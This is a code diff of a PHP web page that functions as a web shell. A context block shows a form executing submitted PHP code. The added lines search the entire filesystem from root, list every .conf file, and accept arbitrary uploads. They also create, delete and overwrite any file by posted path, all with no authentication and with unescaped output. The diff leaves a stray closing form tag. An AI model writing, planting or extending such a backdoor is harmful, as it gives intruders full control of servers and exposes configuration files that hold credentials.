@@ -144,6 +144,7 @@
         <textarea name="php_code" class="php-code" rows="4" placeholder="Write PHP code here"></textarea>
         <input type="submit" value="Execute PHP">
     </form>
+    
     <?php 
     if (isset($_POST['php_code'])) {
         try {
@@ -157,127 +158,160 @@
     } 
     ?>
 
-    <h2>Search Files and Directories</h2>
-    <form method="POST">
-        <label>Search:</label>
-        <input type="text" name="search_term" placeholder="Enter file or directory name">
-        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
-        <input type="submit" value="Search">
-    </form>
+<h2>Search Files and Directories</h2>
+<form method="POST">
+    <label>Search:</label>
+    <input type="text" name="search_term" placeholder="Enter file or directory name">
+    <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
+    <input type="submit" value="Search">
+</form>
 
-    <?php
-    define('ROOT_DIR', '/'); 
+<?php
+define('ROOT_DIR', '/'); 
 
-    function searchFilesAndDirectories($directory, $term) {
-        $matches = [];
-        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
-        foreach ($iterator as $file) {
-            if (stripos($file->getFilename(), $term) !== false) {
-                $matches[] = $file->getPathname();
+function searchFilesAndDirectories($directory, $term) {
+    $matches = [];
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
+    foreach ($iterator as $file) {
+        if (stripos($file->getFilename(), $term) !== false) {
+            $matches[] = $file->getPathname();
+        }
+    }
+    return $matches;
+}
+
+function searchConfigFiles($directory) {
+    $matches = [];
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
+    foreach ($iterator as $file) {
+        if ($file->getExtension() === 'conf') {
+            $matches[] = $file->getPathname();
+        }
+    }
+    return $matches;
+}
+
+if (isset($_POST['search_term'])) {
+    $searchTerm = $_POST['search_term'];
+    $resultsCurrentDir = searchFilesAndDirectories($currentDir, $searchTerm);
+    $resultsRootDir = searchFilesAndDirectories(ROOT_DIR, $searchTerm);
+    $configFilesCurrentDir = searchConfigFiles($currentDir);
+    $configFilesRootDir = searchConfigFiles(ROOT_DIR);
+    $results = array_merge($resultsCurrentDir, $resultsRootDir, $configFilesCurrentDir, $configFilesRootDir);
+
+    if (empty($results)) {
+        echo "<p>No files or directories found for '$searchTerm'.</p>";
+    } else {
+        echo "<h3>Search Results for '$searchTerm':</h3><ul>";
+        foreach ($results as $result) {
+            $extension = pathinfo($result, PATHINFO_EXTENSION);
+            if ($extension == 'conf') {
+                echo "<li><strong>$result (.conf file)</strong></li>";
+            } else {
+                echo "<li>$result</li>";
             }
         }
-        return $matches;
+        echo "</ul>";
     }
+}
 
-    if (isset($_POST['search_term'])) {
-        $searchTerm = $_POST['search_term'];
-        $results = searchFilesAndDirectories(ROOT_DIR, $searchTerm);
+if (isset($_FILES['fileToUpload'])) {
+    $targetFile = $currentDir . '/' . basename($_FILES['fileToUpload']['name']);
+    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
+        echo "<p>File uploaded successfully: $targetFile</p>";
+    } else {
+        echo "<p>Error uploading file.</p>";
+    }
+}
+?>
 
-        if (empty($results)) {
-            echo "<p>No files or directories found for '$searchTerm'.</p>";
-        } else {
-            echo "<h3>Search Results for '$searchTerm':</h3><ul>";
-            foreach ($results as $result) {
-                echo "<li>$result
-                    <form method='POST' style='display:inline-block;'>
-                        <input type='hidden' name='directory' value='" . dirname($result) . "'>
-                        <input type='hidden' name='view_file' value='" . basename($result) . "'>
-                        <input type='submit' value='View'>
-                    </form>
-                    <form method='POST' style='display:inline-block;'>
-                        <input type='hidden' name='directory' value='" . dirname($result) . "'>
-                        <input type='hidden' name='edit_file' value='" . basename($result) . "'>
-                        <input type='submit' value='Edit'>
-                    </form>
-                    <form method='POST' style='display:inline-block;'>
-                        <input type='hidden' name='directory' value='" . dirname($result) . "'>
-                        <input type='hidden' name='delete_file' value='" . basename($result) . "'>
-                        <input type='submit' value='Delete' onclick='return confirm(\"Are you sure you want to delete this file?\");'>
-                    </form>
-                </li>";
-            }
-            echo "</ul>";
+<h2>Create New File</h2>
+<form method="POST">
+    <label for="newFileName">New File Name:</label>
+    <input type="text" name="newFileName" id="newFileName" placeholder="Enter file name">
+    <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
+    <input type="submit" value="Create File">
+</form>
+
+<?php
+if (isset($_POST['newFileName'])) {
+    $newFileName = $currentDir . '/' . basename($_POST['newFileName']);
+    if (file_put_contents($newFileName, '') !== false) {
+        echo "<p>File created successfully: $newFileName</p>";
+    } else {
+        echo "<p>Error creating file.</p>";
+    }
+}
+?>
+
+<h2>Files in Directory</h2>
+<table>
+    <tr>
+        <th>File Name</th>
+        <th>Permissions</th>
+        <th>Actions</th>
+    </tr>
+    <?php
+    $files = scandir($currentDir);
+    foreach ($files as $file) {
+        if ($file !== '.' && $file !== '..') {
+            echo "<tr>
+                    <td>$file</td>
+                    <td>" . formatPermissions($currentDir . '/' . $file) . "</td>
+                    <td>
+                         </form>
+                        <form method='POST' style='display:inline-block;'>
+                            <input type='hidden' name='directory' value='$currentDir'>
+                            <input type='hidden' name='delete_file' value='$file'>
+                            <input type='submit' value='Delete' onclick='return confirm(\"Are you sure you want to delete this file?\");'>
+                        </form>
+                    </td>
+                </tr>";
         }
     }
     ?>
+</table>
 
-    <h2>Files in Directory</h2>
-    <table>
-        <tr>
-            <th>File Name</th>
-            <th>Permissions</th>
-            <th>Actions</th>
-        </tr>
-        <?php
-        $files = scandir($currentDir);
-        foreach ($files as $file) {
-            if ($file !== '.' && $file !== '..') {
-                echo "<tr>
-                        <td>$file</td>
-                        <td>" . formatPermissions($currentDir . '/' . $file) . "</td>
-                        <td>
-                            <form method='POST' style='display:inline-block;'>
-                                <input type='hidden' name='directory' value='$currentDir'>
-                                <input type='hidden' name='view_file' value='$file'>
-                                <input type='submit' value='View'>
-                            </form>
-                            <form method='POST' style='display:inline-block;'>
-                                <input type='hidden' name='directory' value='$currentDir'>
-                                <input type='hidden' name='edit_file' value='$file'>
-                                <input type='submit' value='Edit'>
-                            </form>
-                            <form method='POST' style='display:inline-block;'>
-                                <input type='hidden' name='directory' value='$currentDir'>
-                                <input type='hidden' name='delete_file' value='$file'>
-                                <input type='submit' value='Delete' onclick='return confirm(\"Are you sure you want to delete this file?\");'>
-                            </form>
-                        </td>
-                    </tr>";
-            }
-        }
-        ?>
-    </table>
+<?php 
+if (isset($_POST['delete_file'])) {
+    $fileToDelete = $currentDir . '/' . $_POST['delete_file'];
+    if (unlink($fileToDelete)) {
+        echo "<p>File '{$_POST['delete_file']}' has been deleted successfully.</p>";
+    } else {
+        echo "<p>Failed to delete file '{$_POST['delete_file']}'.</p>";
+    }
+}
+?>
 
-    <h2>Add File</h2>
+    <h2>Edit File</h2>
     <form method="POST">
+        <label>File to Edit:</label>
+        <input type="text" name="edit_file" placeholder="Enter the file path">
         <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
-        <label>File Name:</label>
-        <input type="text" name="new_file_name" required>
-        <label>File Content:</label>
-        <textarea name="new_file_content" rows="4" required></textarea>
-        <input type="submit" value="Add File">
+        <input type="submit" value="Open File">
     </form>
 
-    <?php 
-    if (isset($_POST['new_file_name']) && isset($_POST['new_file_content'])) {
-        $newFileName = $_POST['new_file_name'];
-        $newFilePath = $currentDir . '/' . $newFileName;
-        $content = $_POST['new_file_content'];
-
-        if (file_put_contents($newFilePath, $content) !== false) {
-            echo "<p>File '$newFileName' has been created successfully.</p>";
+    <?php
+    if (isset($_POST['edit_file'])) {
+        $fileToEdit = $_POST['edit_file'];
+        if (file_exists($fileToEdit)) {
+            $fileContents = file_get_contents($fileToEdit);
+            echo '<form method="POST">';
+            echo '<input type="hidden" name="directory" value="' . $currentDir . '">';
+            echo '<input type="hidden" name="save_file" value="' . $fileToEdit . '">';
+            echo '<textarea name="file_contents" rows="10">' . htmlspecialchars($fileContents) . '</textarea>';
+            echo '<input type="submit" value="Save Changes">';
+            echo '</form>';
         } else {
-            echo "<p>Failed to create file '$newFileName'.</p>";
+            echo "<p>File '$fileToEdit' does not exist.</p>";
         }
     }
 
-    if (isset($_POST['delete_file'])) {
-        $fileToDelete = $currentDir . '/' . $_POST['delete_file'];
-        if (unlink($fileToDelete)) {
-            echo "<p>File '{$_POST['delete_file']}' has been deleted successfully.</p>";
-        } else {
-            echo "<p>Failed to delete file '{$_POST['delete_file']}'.</p>";
-        }
+    if (isset($_POST['save_file']) && isset($_POST['file_contents'])) {
+        $fileToSave = $_POST['save_file'];
+        $newContents = $_POST['file_contents'];
+        file_put_contents($fileToSave, $newContents);
+        echo "<p>File '$fileToSave' has been updated successfully.</p>";
     }
     ?>
 </body>
